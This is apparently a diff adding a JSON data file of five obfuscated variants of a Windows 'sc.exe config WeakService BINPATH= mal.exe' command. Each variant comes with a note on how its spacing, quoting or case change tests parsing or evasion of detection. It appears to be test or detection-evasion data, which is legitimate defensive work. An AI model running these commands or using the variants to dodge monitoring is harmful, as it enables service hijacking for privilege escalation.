@@ -1,0 +1,22 @@
+[
+  {
+    "output": "sc.exe  config   \"WeakService\"   BINPATH=   \"mal.exe\"",
+    "explanation": "Added extra spaces between arguments and used quotes around the service name to simulate potential bypass via insertion and spacing techniques."
+  },
+  {
+    "output": "sc.exe config WeakService binPath= \"mal.exe\"",
+    "explanation": "Used lowercase 'binPath' instead of 'BINPATH=' to test case-insensitive parsing and simulate substitution of equivalent syntax."
+  },
+  {
+    "output": "\"sc.exe\" config WeakService BINPATH= \"mal.exe\"",
+    "explanation": "Wrapped the executable name in quotes to test parsing behavior with quoted paths, simulating insertion techniques."
+  },
+  {
+    "output": "sc.exe config WeakService BINPATH=mal.exe",
+    "explanation": "Removed the space between BINPATH= and the value to test if the command still parses correctly, simulating omission techniques."
+  },
+  {
+    "output": "sc.exe config WeakService \"BINPATH=mal.exe\"",
+    "explanation": "Wrapped the entire BINPATH argument in quotes to test if the command still functions, simulating insertion techniques."
+  }
+]
